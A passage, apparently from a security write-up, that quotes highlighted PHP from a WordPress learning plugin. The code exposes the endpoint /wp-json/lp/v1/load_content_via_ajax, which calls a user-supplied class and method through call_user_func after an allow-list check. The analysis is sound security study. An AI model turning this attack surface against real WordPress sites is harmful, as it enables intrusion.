class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;register_rest_route&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;namespace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$rest_base&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$args&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$override&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Thus, this API exposes the endpoint:&#xA;&lt;strong&gt;&lt;code&gt;/wp-json/lp/v1/load_content_via_ajax&lt;/code&gt;&lt;/strong&gt;,&#xA;and the &lt;code&gt;get_content&lt;/code&gt; callback will be invoked when receiving a request.&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;get_content&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;WP_REST_Request&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$request&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;LP_REST_Response&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$response&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;LP_REST_Response&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;try&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$params&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get_params&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$params&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;callback&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;||&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$params&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;args&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;Exception&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Error:&amp;ensp;params&amp;ensp;invalid!&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;@var&amp;ensp;array&amp;ensp;$args&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$args&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$params&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;args&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$callBack&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$params&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;callback&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get_method&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;===&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;GET&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$args&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;LP_Helper&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;json_decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$params&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;args&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;true&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$callBack&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;LP_Helper&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;json_decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$params&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;callback&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;true&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$callBack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;class&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;||&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$callBack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;method&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;Exception&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Error:&amp;ensp;callback&amp;ensp;invalid!&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$class&lt;/span&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$callBack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;class&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$method&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$callBack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;method&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Security:&amp;ensp;check&amp;ensp;callback&amp;ensp;is&amp;ensp;registered.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$allow_callbacks&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;apply_filters&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;lp/rest/ajax/allow_callback&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$callBackStr&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$class&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;:&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$method&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;in_array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$callBackStr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$allow_callbacks&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;Exception&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Error:&amp;ensp;callback&amp;ensp;is&amp;ensp;not&amp;ensp;register!&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Check&amp;ensp;class&amp;ensp;and&amp;ensp;method&amp;ensp;is&amp;ensp;callable.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;is_callable&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$class&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$method&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;call_user_func&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$class&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$method&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$args&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;Exception&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Error:&amp;ensp;callback&amp;ensp;is&amp;ensp;not&amp;ensp;callable!&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;instanceof&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;stdClass&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;content&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;Exception&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Error:&amp;ensp;data&amp;ensp;content&amp;ensp;invalid!&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span 